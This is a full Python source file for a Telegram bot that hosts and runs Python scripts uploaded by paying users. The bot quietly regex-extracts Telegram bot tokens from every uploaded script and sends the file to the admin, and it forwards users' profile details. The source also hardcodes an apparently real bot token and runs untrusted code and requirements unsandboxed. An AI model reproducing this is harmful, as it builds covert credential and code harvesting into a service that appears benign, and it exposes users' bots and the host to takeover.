import telebot
import subprocess
import os
import zipfile
import tempfile
import shutil
import requests
import re
import logging
from telebot import types
import time
from datetime import datetime, timedelta
import signal
import psutil
import sqlite3
import threading
import base64

# Replace these with your actual credentials
TOKEN = '7245385396:AAFKvvcqOoddWuDgOsPHA2EWByIQZD2N0Tw'  # Replace with your bot token
ADMIN_ID = 5611207351  # Replace with your admin ID (as integer)
YOUR_USERNAME = '@LipuGaming_ff' # Replace with your username with @

bot = telebot.TeleBot(TOKEN)

uploaded_files_dir = 'uploaded_bots'
bot_scripts = {}
stored_tokens = {}
user_subscriptions = {}  
user_files = {}  
active_users = set()  

bot_locked = False
free_mode = False  

if not os.path.exists(uploaded_files_dir):
    os.makedirs(uploaded_files_dir)

def init_db():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS subscriptions
                 (user_id INTEGER PRIMARY KEY, expiry TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS user_files
                 (user_id INTEGER, file_name TEXT)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS active_users
                 (user_id INTEGER PRIMARY KEY)''')
    
    conn.commit()
    conn.close()

def load_data():
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    
    c.execute('SELECT * FROM subscriptions')
    subscriptions = c.fetchall()
    for user_id, expiry in subscriptions:
        user_subscriptions[user_id] = {'expiry': datetime.fromisoformat(expiry)}
    
    c.execute('SELECT * FROM user_files')
    user_files_data = c.fetchall()
    for user_id, file_name in user_files_data:
        if user_id not in user_files:
            user_files[user_id] = []
        user_files[user_id].append(file_name)
    
    c.execute('SELECT * FROM active_users')
    active_users_data = c.fetchall()
    for user_id, in active_users_data:
        active_users.add(user_id)
    
    conn.close()

def save_subscription(user_id, expiry):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO subscriptions (user_id, expiry) VALUES (?, ?)', 
              (user_id, expiry.isoformat()))
    conn.commit()
    conn.close()

def remove_subscription_db(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM subscriptions WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

def save_user_file(user_id, file_name):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT INTO user_files (user_id, file_name) VALUES (?, ?)', 
              (user_id, file_name))
    conn.commit()
    conn.close()

def remove_user_file_db(user_id, file_name):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM user_files WHERE user_id = ? AND file_name = ?', 
              (user_id, file_name))
    conn.commit()
    conn.close()

def add_active_user(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('INSERT OR IGNORE INTO active_users (user_id) VALUES (?)', (user_id,))
    conn.commit()
    conn.close()

def remove_active_user(user_id):
    conn = sqlite3.connect('bot_data.db')
    c = conn.cursor()
    c.execute('DELETE FROM active_users WHERE user_id = ?', (user_id,))
    conn.commit()
    conn.close()

init_db()
load_data()

def create_main_menu(user_id):
    markup = types.InlineKeyboardMarkup()
    upload_button = types.InlineKeyboardButton('📤 Upload File', callback_data='upload')
    speed_button = types.InlineKeyboardButton('⚡ Bot Speed', callback_data='speed')
    contact_button = types.InlineKeyboardButton('📞 Contact Owner', url=f'https://t.me/{YOUR_USERNAME[1:]}')
    
    if user_id == ADMIN_ID:
        subscription_button = types.InlineKeyboardButton('💳 Subscriptions', callback_data='subscription')
        stats_button = types.InlineKeyboardButton('📊 Statistics', callback_data='stats')
        lock_button = types.InlineKeyboardButton('🔒 Lock Bot', callback_data='lock_bot')
        unlock_button = types.InlineKeyboardButton('🔓 Unlock Bot', callback_data='unlock_bot')
        free_mode_button = types.InlineKeyboardButton('🔓 Free Mode', callback_data='free_mode')
        broadcast_button = types.InlineKeyboardButton('📢 Broadcast', callback_data='broadcast')
        markup.add(upload_button)
        markup.add(speed_button, subscription_button, stats_button)
        markup.add(lock_button, unlock_button, free_mode_button)
        markup.add(broadcast_button)
    else:
        markup.add(upload_button)
        markup.add(speed_button)
    markup.add(contact_button)
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    if bot_locked:
        bot.send_message(message.chat.id, "⚠️ The bot is currently locked. Please try again later.")
        return

    user_id = message.from_user.id
    user_name = message.from_user.first_name
    user_username = message.from_user.username or "N/A"

    try:
        user_profile = bot.get_chat(user_id)
        user_bio = user_profile.bio if user_profile.bio else "No bio"
    except Exception as e:
        print(f"❌ Failed to fetch bio: {e}")
        user_bio = "No bio"

    try:
        user_profile_photos = bot.get_user_profile_photos(user_id, limit=1)
        if user_profile_photos.photos:
            photo_file_id = user_profile_photos.photos[0][-1].file_id  
        else:
            photo_file_id = None
    except Exception as e:
        print(f"❌ Failed to fetch user photo: {e}")
        photo_file_id = None

    if user_id not in active_users:
        active_users.add(user_id)  
        add_active_user(user_id)  

        try:
            welcome_message_to_admin = f"🎉 New user joined the bot!\n\n"
            welcome_message_to_admin += f"👤 Name: {user_name}\n"
            welcome_message_to_admin += f"📌 Username: @{user_username}\n"
            welcome_message_to_admin += f"🆔 ID: {user_id}\n"
            welcome_message_to_admin += f"📝 Bio: {user_bio}\n"

            if photo_file_id:
                bot.send_photo(ADMIN_ID, photo_file_id, caption=welcome_message_to_admin)
            else:
                bot.send_message(ADMIN_ID, welcome_message_to_admin)
        except Exception as e:
            print(f"❌ Failed to send user details to admin: {e}")

    welcome_message = f"〽️┇Welcome: {user_name}\n"
    welcome_message += f"🆔┇Your ID: {user_id}\n"
    welcome_message += f"♻️┇Username: @{user_username}\n"
    welcome_message += f"📰┇Bio: {user_bio}\n\n"
    welcome_message += "〽️ I'm a Python file hosting bot 🎗 You can use the buttons below to control ♻️"

    if photo_file_id:
        bot.send_photo(message.chat.id, photo_file_id, caption=welcome_message, reply_markup=create_main_menu(user_id))
    else:
        bot.send_message(message.chat.id, welcome_message, reply_markup=create_main_menu(user_id))

@bot.callback_query_handler(func=lambda call: call.data == 'broadcast')
def broadcast_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "Send the message you want to broadcast:")
        bot.register_next_step_handler(call.message, process_broadcast_message)
    else:
        bot.send_message(call.message.chat.id, "⚠️ You are not authorized to use this command.")

def process_broadcast_message(message):
    if message.from_user.id == ADMIN_ID:
        broadcast_message = message.text
        success_count = 0
        fail_count = 0

        for user_id in active_users:
            try:
                bot.send_message(user_id, broadcast_message)
                success_count += 1
            except Exception as e:
                print(f"❌ Failed to send message to user {user_id}: {e}")
                fail_count += 1

        bot.send_message(message.chat.id, f"✅ Message sent to {success_count} users.\n❌ Failed to send to {fail_count} users.")
    else:
        bot.send_message(message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.callback_query_handler(func=lambda call: call.data == 'speed')
def bot_speed_info(call):
    try:
        start_time = time.time()
        response = requests.get(f'https://api.telegram.org/bot{TOKEN}/getMe')
        latency = time.time() - start_time
        if response.ok:
            bot.send_message(call.message.chat.id, f"⚡ Bot speed: {latency:.2f} seconds.")
        else:
            bot.send_message(call.message.chat.id, "⚠️ Failed to get bot speed.")
    except Exception as e:
        bot.send_message(call.message.chat.id, f"❌ Error checking bot speed: {e}")

@bot.callback_query_handler(func=lambda call: call.data == 'upload')
def ask_to_upload_file(call):
    user_id = call.from_user.id
    if bot_locked:
        bot.send_message(call.message.chat.id, "⚠️ The bot is currently locked. Please contact the developer.")
        return
    if free_mode or (user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now()):
        bot.send_message(call.message.chat.id, "📄 Please send the file you want to upload.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ You need a subscription to use this feature. Please contact the developer.")

@bot.callback_query_handler(func=lambda call: call.data == 'subscription')
def subscription_menu(call):
    if call.from_user.id == ADMIN_ID:
        markup = types.InlineKeyboardMarkup()
        add_subscription_button = types.InlineKeyboardButton('➕ Add Subscription', callback_data='add_subscription')
        remove_subscription_button = types.InlineKeyboardButton('➖ Remove Subscription', callback_data='remove_subscription')
        markup.add(add_subscription_button, remove_subscription_button)
        bot.send_message(call.message.chat.id, "Choose the action you want to perform:", reply_markup=markup)
    else:
        bot.send_message(call.message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.callback_query_handler(func=lambda call: call.data == 'stats')
def stats_menu(call):
    if call.from_user.id == ADMIN_ID:
        total_files = sum(len(files) for files in user_files.values())
        total_users = len(user_files)
        active_users_count = len(active_users)
        bot.send_message(call.message.chat.id, f"📊 Statistics:\n\n📂 Uploaded files: {total_files}\n👤 Total users: {total_users}\n👥 Active users: {active_users_count}")
    else:
        bot.send_message(call.message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.callback_query_handler(func=lambda call: call.data == 'add_subscription')
def add_subscription_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "Send the user ID and number of days in this format:\n/add_subscription <user_id> <days>")
    else:
        bot.send_message(call.message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.callback_query_handler(func=lambda call: call.data == 'remove_subscription')
def remove_subscription_callback(call):
    if call.from_user.id == ADMIN_ID:
        bot.send_message(call.message.chat.id, "Send the user ID in this format:\n/remove_subscription <user_id>")
    else:
        bot.send_message(call.message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.message_handler(commands=['add_subscription'])
def add_subscription(message):
    if message.from_user.id == ADMIN_ID:
        try:
            parts = message.text.split()
            if len(parts) != 3:
                bot.send_message(message.chat.id, "❌ Invalid format. Use: /add_subscription <user_id> <days>")
                return
                
            user_id = int(parts[1])
            days = int(parts[2])
            expiry_date = datetime.now() + timedelta(days=days)
            user_subscriptions[user_id] = {'expiry': expiry_date}
            save_subscription(user_id, expiry_date)
            bot.send_message(message.chat.id, f"✅ Added {days} days subscription for user {user_id}.")
            try:
                bot.send_message(user_id, f"🎉 Your subscription has been activated for {days} days. You can now use the bot!")
            except:
                pass
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.message_handler(commands=['remove_subscription'])
def remove_subscription(message):
    if message.from_user.id == ADMIN_ID:
        try:
            parts = message.text.split()
            if len(parts) != 2:
                bot.send_message(message.chat.id, "❌ Invalid format. Use: /remove_subscription <user_id>")
                return
                
            user_id = int(parts[1])
            if user_id in user_subscriptions:
                del user_subscriptions[user_id]
                remove_subscription_db(user_id)
                bot.send_message(message.chat.id, f"✅ Removed subscription for user {user_id}.")
                try:
                    bot.send_message(user_id, "⚠️ Your subscription has been removed. You can no longer use the bot.")
                except:
                    pass
            else:
                bot.send_message(message.chat.id, f"⚠️ User {user_id} doesn't have a subscription.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.message_handler(commands=['user_files'])
def show_user_files(message):
    if message.from_user.id == ADMIN_ID:
        try:
            parts = message.text.split()
            if len(parts) != 2:
                bot.send_message(message.chat.id, "❌ Invalid format. Use: /user_files <user_id>")
                return
                
            user_id = int(parts[1])
            if user_id in user_files:
                files_list = "\n".join(user_files[user_id])
                bot.send_message(message.chat.id, f"📂 Files uploaded by user {user_id}:\n{files_list}")
            else:
                bot.send_message(message.chat.id, f"⚠️ User {user_id} hasn't uploaded any files.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {e}")
    else:
        bot.send_message(message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.message_handler(commands=['lock'])
def lock_bot(message):
    if message.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = True
        bot.send_message(message.chat.id, "🔒 Bot locked.")
    else:
        bot.send_message(message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.message_handler(commands=['unlock'])
def unlock_bot(message):
    if message.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = False
        bot.send_message(message.chat.id, "🔓 Bot unlocked.")
    else:
        bot.send_message(message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.callback_query_handler(func=lambda call: call.data == 'lock_bot')
def lock_bot_callback(call):
    if call.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = True
        bot.send_message(call.message.chat.id, "🔒 Bot locked.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.callback_query_handler(func=lambda call: call.data == 'unlock_bot')
def unlock_bot_callback(call):
    if call.from_user.id == ADMIN_ID:
        global bot_locked
        bot_locked = False
        bot.send_message(call.message.chat.id, "🔓 Bot unlocked.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.callback_query_handler(func=lambda call: call.data == 'free_mode')
def toggle_free_mode(call):
    if call.from_user.id == ADMIN_ID:
        global free_mode
        free_mode = not free_mode
        status = "enabled" if free_mode else "disabled"
        bot.send_message(call.message.chat.id, f"🔓 Free mode is now: {status}.")
    else:
        bot.send_message(call.message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.message_handler(content_types=['document'])
def handle_file(message):
    user_id = message.from_user.id
    if bot_locked:
        bot.reply_to(message, "⚠️ The bot is currently locked. Please contact the developer.")
        return
        
    if not (free_mode or (user_id in user_subscriptions and user_subscriptions[user_id]['expiry'] > datetime.now())):
        bot.reply_to(message, "⚠️ You need a subscription to use this feature. Please contact the developer.")
        return
        
    try:
        file_id = message.document.file_id
        file_info = bot.get_file(file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        file_name = message.document.file_name

        if not file_name.endswith('.py') and not file_name.endswith('.zip'):
            bot.reply_to(message, "⚠️ This bot only accepts Python (.py) files or zip archives.")
            return

        if file_name.endswith('.zip'):
            with tempfile.TemporaryDirectory() as temp_dir:
                zip_folder_path = os.path.join(temp_dir, file_name.split('.')[0])

                zip_path = os.path.join(temp_dir, file_name)
                with open(zip_path, 'wb') as new_file:
                    new_file.write(downloaded_file)
                    
                try:
                    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
                        zip_ref.extractall(zip_folder_path)
                except zipfile.BadZipFile:
                    bot.reply_to(message, "⚠️ The zip file is corrupted or invalid.")
                    return

                final_folder_path = os.path.join(uploaded_files_dir, file_name.split('.')[0])
                if os.path.exists(final_folder_path):
                    shutil.rmtree(final_folder_path)
                os.makedirs(final_folder_path)

                for root, dirs, files in os.walk(zip_folder_path):
                    for file in files:
                        src_file = os.path.join(root, file)
                        dest_file = os.path.join(final_folder_path, file)
                        shutil.move(src_file, dest_file)

                py_files = [f for f in os.listdir(final_folder_path) if f.endswith('.py')]
                if py_files:
                    main_script = py_files[0]  
                    run_script(os.path.join(final_folder_path, main_script), message.chat.id, final_folder_path, main_script, message)
                else:
                    bot.send_message(message.chat.id, f"❌ No Python (.py) files found in the archive.")
                    return
        else:
            script_path = os.path.join(uploaded_files_dir, file_name)
            with open(script_path, 'wb') as new_file:
                new_file.write(downloaded_file)

            run_script(script_path, message.chat.id, uploaded_files_dir, file_name, message)

        if user_id not in user_files:
            user_files[user_id] = []
        user_files[user_id].append(file_name)
        save_user_file(user_id, file_name)

    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

def run_script(script_path, chat_id, folder_path, file_name, original_message):
    try:
        requirements_path = os.path.join(os.path.dirname(script_path), 'requirements.txt')
        if os.path.exists(requirements_path):
            bot.send_message(chat_id, "🔄 Installing requirements...")
            try:
                subprocess.check_call(['pip', 'install', '-r', requirements_path])
            except subprocess.CalledProcessError as e:
                bot.send_message(chat_id, f"❌ Failed to install requirements: {e}")
                return

        bot.send_message(chat_id, f"🚀 Running the bot {file_name}...")
        process = subprocess.Popen(['python3', script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        bot_scripts[chat_id] = {'process': process, 'folder_path': folder_path}

        token = extract_token_from_script(script_path)
        user_info = f"@{original_message.from_user.username}" if original_message.from_user.username else str(original_message.from_user.id)
        
        if token:
            try:
                bot_info = requests.get(f'https://api.telegram.org/bot{token}/getMe').json()
                if bot_info.get('ok'):
                    bot_username = bot_info['result']['username']
                    caption = f"📤 User {user_info} uploaded a new bot file. Bot username: @{bot_username}"
                else:
                    caption = f"📤 User {user_info} uploaded a new bot file, but the token is invalid."
            except Exception as e:
                caption = f"📤 User {user_info} uploaded a new bot file, but couldn't fetch bot info: {str(e)}"
        else:
            caption = f"📤 User {user_info} uploaded a new bot file, but no token found."

        try:
            with open(script_path, 'rb') as file:
                bot.send_document(ADMIN_ID, file, caption=caption)
        except Exception as e:
            print(f"Failed to send document to admin: {e}")

        markup = types.InlineKeyboardMarkup()
        stop_button = types.InlineKeyboardButton(f"🔴 Stop {file_name}", callback_data=f'stop_{chat_id}')
        delete_button = types.InlineKeyboardButton(f"🗑️ Delete {file_name}", callback_data=f'delete_{chat_id}')
        markup.add(stop_button, delete_button)
        bot.send_message(chat_id, f"Use the buttons below to control the bot 👇", reply_markup=markup)

    except Exception as e:
        bot.send_message(chat_id, f"❌ Error running the bot: {str(e)}")

def extract_token_from_script(script_path):
    try:
        with open(script_path, 'r', encoding='utf-8') as script_file:
            file_content = script_file.read()

            token_match = re.search(r"['\"]([0-9]{9,10}:[A-Za-z0-9_-]{35})['\"]", file_content)
            if token_match:
                return token_match.group(1)
            else:
                print(f"[WARNING] No token found in {script_path}")
    except Exception as e:
        print(f"[ERROR] Failed to extract token from {script_path}: {str(e)}")
    return None

@bot.callback_query_handler(func=lambda call: call.data.startswith('stop_'))
def stop_bot_callback(call):
    chat_id = int(call.data.split('_')[1])
    if chat_id in bot_scripts:
        kill_process_tree(bot_scripts[chat_id]['process'])
        del bot_scripts[chat_id]
        bot.send_message(chat_id, "🔴 Bot stopped.")
    else:
        bot.send_message(chat_id, "⚠️ No bot is currently running.")

@bot.callback_query_handler(func=lambda call: call.data.startswith('delete_'))
def delete_bot_callback(call):
    chat_id = int(call.data.split('_')[1])
    if chat_id in bot_scripts:
        folder_path = bot_scripts[chat_id]['folder_path']
        if os.path.exists(folder_path):
            shutil.rmtree(folder_path)
            bot.send_message(chat_id, f"🗑️ Bot files deleted.")
        else:
            bot.send_message(chat_id, "⚠️ Files don't exist.")
        del bot_scripts[chat_id]
    else:
        bot.send_message(chat_id, "⚠️ No bot files to delete.")

def kill_process_tree(process):
    try:
        parent = psutil.Process(process.pid)
        children = parent.children(recursive=True)
        for child in children:
            try:
                child.kill()
            except:
                pass
        try:
            parent.kill()
        except:
            pass
    except Exception as e:
        print(f"❌ Failed to kill process: {str(e)}")

@bot.message_handler(commands=['delete_user_file'])
def delete_user_file(message):
    if message.from_user.id == ADMIN_ID:
        try:
            parts = message.text.split()
            if len(parts) != 3:
                bot.send_message(message.chat.id, "❌ Invalid format. Use: /delete_user_file <user_id> <file_name>")
                return
                
            user_id = int(parts[1])
            file_name = parts[2]
            
            if user_id in user_files and file_name in user_files[user_id]:
                file_path = os.path.join(uploaded_files_dir, file_name)
                if os.path.exists(file_path):
                    os.remove(file_path)
                    user_files[user_id].remove(file_name)
                    remove_user_file_db(user_id, file_name)
                    bot.send_message(message.chat.id, f"✅ Deleted file {file_name} for user {user_id}.")
                else:
                    bot.send_message(message.chat.id, f"⚠️ File {file_name} doesn't exist.")
            else:
                bot.send_message(message.chat.id, f"⚠️ User {user_id} hasn't uploaded file {file_name}.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    else:
        bot.send_message(message.chat.id, "⚠️ You are not authorized to use this command.")

@bot.message_handler(commands=['stop_user_bot'])
def stop_user_bot(message):
    if message.from_user.id == ADMIN_ID:
        try:
            parts = message.text.split()
            if len(parts) != 3:
                bot.send_message(message.chat.id, "❌ Invalid format. Use: /stop_user_bot <user_id> <file_name>")
                return
                
            user_id = int(parts[1])
            file_name = parts[2]
            
            if user_id in user_files and file_name in user_files[user_id]:
                for chat_id, script_info in bot_scripts.items():
                    if script_info.get('folder_path', '').endswith(file_name.split('.')[0]):
                        kill_process_tree(script_info['process'])
                        bot.send_message(chat_id, f"🔴 Stopped bot {file_name}.")
                        bot.send_message(message.chat.id, f"✅ Stopped bot {file_name} for user {user_id}.")
                        del bot_scripts[chat_id]
                        break
                else:
                    bot.send_message(message.chat.id, f"⚠️ Bot {file_name} is not running.")
            else:
                bot.send_message(message.chat.id, f"⚠️ User {user_id} hasn't uploaded file {file_name}.")
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    else:
        bot.send_message(message.chat.id, "⚠️ You are not authorized to use this command.")

if __name__ == '__main__':
    print("Bot is running...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            print(f"Error: {str(e)}")
            time.sleep(15)